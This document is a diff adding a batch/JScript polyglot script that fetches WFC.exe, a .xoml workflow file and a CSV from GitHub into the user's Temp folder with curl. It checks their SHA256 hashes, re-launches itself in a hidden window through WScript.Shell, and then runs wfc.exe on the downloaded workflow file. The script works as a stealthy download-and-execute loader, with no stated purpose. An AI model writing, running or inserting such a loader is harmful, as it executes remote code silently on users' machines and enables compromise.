@@ -1,0 +1,107 @@
+@set @x=0 /*
+@echo off
+setlocal EnableDelayedExpansion
+
+if "%~1"=="__s__" goto :m
+
+:m
+
+if exist "%LOCALAPPDATA%\Temp\wfc.exe" (
+    goto :f1d
+)
+
+:f1u1
+set "D=%LOCALAPPDATA%\Temp\wfc.exe"
+for %%F in ("!D!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+curl -LJ -s -o "%LOCALAPPDATA%\Temp\wfc.exe" "https://github.com/cw6787/wfc/raw/refs/heads/main/WFC.exe"
+if !errorlevel! neq 0 (
+    del "%LOCALAPPDATA%\Temp\wfc.exe" 2>nul
+    goto :f1uf
+)
+set "H1="
+for /f "skip=1 delims=" %%H in ('certutil -hashfile "%LOCALAPPDATA%\Temp\wfc.exe" SHA256') do if not defined H1 set "H1=%%H"
+set "H1=!H1: =!"
+if /i "!H1!"=="4dff4c148526b3cb946c6660cac910a381c65f0227903770b2a5271c8c871b1f" goto :f1o
+del "%LOCALAPPDATA%\Temp\wfc.exe" 2>nul
+
+:f1uf
+exit /b 1
+
+:f1o
+cscript //nologo //E:JScript "%~f0" "%~f0" __s__
+exit /b 0
+
+:f1d
+
+if exist "%LOCALAPPDATA%\Temp\preview.xoml" (
+    goto :f2d
+)
+
+:f2u1
+set "D=%LOCALAPPDATA%\Temp\preview.xoml"
+for %%F in ("!D!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+curl -L -s -o "%LOCALAPPDATA%\Temp\preview.xoml" "https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/preview.xml"
+if !errorlevel! neq 0 (
+    del "%LOCALAPPDATA%\Temp\preview.xoml" 2>nul
+    goto :f2uf
+)
+set "H2="
+for /f "skip=1 delims=" %%H in ('certutil -hashfile "%LOCALAPPDATA%\Temp\preview.xoml" SHA256') do if not defined H2 set "H2=%%H"
+set "H2=!H2: =!"
+if /i "!H2!"=="cf6a0030cf3463cb0d5f0a61d2914678665ac733ed43ee1b8c997cd713102dba" goto :f2o
+del "%LOCALAPPDATA%\Temp\preview.xoml" 2>nul
+
+:f2uf
+exit /b 1
+
+:f2o
+cscript //nologo //E:JScript "%~f0" "%~f0" __s__
+exit /b 0
+
+:f2d
+
+if exist "%LOCALAPPDATA%\Temp\viewtime.csv" (
+    goto :f3d
+)
+
+:f3u1
+set "D=%LOCALAPPDATA%\Temp\viewtime.csv"
+for %%F in ("!D!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+curl -L -s -o "%LOCALAPPDATA%\Temp\viewtime.csv" "https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/Viewtime.csv"
+if !errorlevel! neq 0 (
+    del "%LOCALAPPDATA%\Temp\viewtime.csv" 2>nul
+    goto :f3uf
+)
+set "H3="
+for /f "skip=1 delims=" %%H in ('certutil -hashfile "%LOCALAPPDATA%\Temp\viewtime.csv" SHA256') do if not defined H3 set "H3=%%H"
+set "H3=!H3: =!"
+if /i "!H3!"=="878fd9b2e890463ded5a78c0d624b1e60bdb080bd12301109cd912593592248e" goto :f3o
+del "%LOCALAPPDATA%\Temp\viewtime.csv" 2>nul
+
+:f3uf
+exit /b 1
+
+:f3o
+cscript //nologo //E:JScript "%~f0" "%~f0" __s__
+exit /b 0
+
+:f3d
+
+%LOCALAPPDATA%\Temp\wfc.exe %LOCALAPPDATA%\Temp\preview.xoml"
+if !errorlevel! neq 0 (
+    exit /b 1
+)
+
+endlocal
+exit /b 0
+*/
+var sh = new ActiveXObject('WScript.Shell');
+var bat = WScript.Arguments(0);
+sh.Run("cmd /c \"" + bat + "\" __s__", 0, false);
+WScript.Quit(0);
